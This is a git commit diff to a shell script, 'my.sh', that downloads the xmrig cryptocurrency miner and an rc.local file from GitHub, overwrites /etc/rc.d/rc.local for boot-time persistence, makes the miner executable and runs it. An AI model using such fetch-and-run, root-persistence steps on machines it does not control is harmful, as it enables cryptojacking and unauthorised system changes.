9e09b5bb054459d424a1a7ddb995cbeebab7d278
zy123456-zhong <61346716+zy123456-zhong@users.noreply.github.com>
2020-02-28 23:24:07 +0800

    Update my.sh

--- my.sh
+++ my.sh
@@ -2,7 +2,8 @@
 wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/xmrig-5.7.0.zip
 wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/rc.local
 unzip xmrig-5.7.0.zip
-cat /root/rc.local > /etc/rc.d/rc.local 
+cat /root/rc.local.1 > /etc/rc.d/rc.local 
 chmod +x /etc/rc.d/rc.local
+chmod +x xmrig-5.7.0/xmrig
 ./xmrig-5.7.0/xmrig
 
